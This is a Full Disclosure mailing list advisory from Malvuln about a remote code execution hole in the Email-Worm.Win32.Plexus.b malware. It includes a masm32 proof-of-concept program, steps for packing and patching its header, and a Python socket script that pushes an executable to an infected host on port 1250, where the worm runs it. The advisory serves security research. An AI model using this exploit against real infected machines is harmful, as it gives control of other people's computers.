
Date: Sun, 7 Nov 2021 21:32:47 -0500
From: malvuln <malvuln13@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] Email-Worm.Win32.Plexus.b / Unauthenticated Remote Code
	Execution

Discovery / credits: Malvuln - malvuln.com (c) 2021
Original source:
https://malvuln.com/advisory/ee8990b5d076a7ed601a30eb677cc9be.txt
Contact: malvuln13@...il.com
Media: twitter.com/malvuln

Threat: Email-Worm.Win32.Plexus.b
Vulnerability: Unauthenticated Remote Code Execution
Description: The malware listens on TCP ports 1250 (file write port) and
47435 (random FTP port). Third-party attackers who can reach infected
systems can use a socket program to write binary data to the remote host.
The malware then writes that data to a file named "_up.exe" under
"\Users\Victim\AppData\Local\Temp" that executes immediately.

Exploitation requires a few things for our code to run successfully, as
there seems to be a file size limitation and header issues.

1) Create a very small executable using masm32 in assembly.
2) Pack it using fsg13
3) Prefix our payload with a DOS "MZ" header and "ETX" control char in hex
"\x03" followed by two NULL bytes, as it doesn't write the MZ header
correctly.
4) Use python to read in our EXE payload and push to the infected host.

Type: PE32
MD5: ee8990b5d076a7ed601a30eb677cc9be
Vuln ID: MVID-2021-0400
Disclosure: 11/07/2021


Exploit/PoC:
1) "DOOM.asm" compiled with masm32.

include \masm32\include\masm32rt.inc
.data
HATE db "Masm32:", 0
MyReal8 REAL8 123.456
.data?
aDword dd ?
.code
start:
  invoke MessageBox, 0, chr$("DOOM!"), addr HATE, MB_OK
  mov eax, 123
  exit
end start


2) Pack DOOM.exe using FSG13.


3) Connect to the infected system and push our own PE file.

# -*- coding: utf-8 -*-
from socket import *

MALWARE_HOST="x.x.x.x"
PORT=1250
DOOM="DOOM_FSG.exe"
EXE="MZ \x00\x03\x00\x00"

def doit():
    global EXE
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = EXE + f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("MD5: ee8990b5d076a7ed601a30eb677cc9be")
    print("By Malvuln");

if __name__=="__main__":
    doit()


Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/
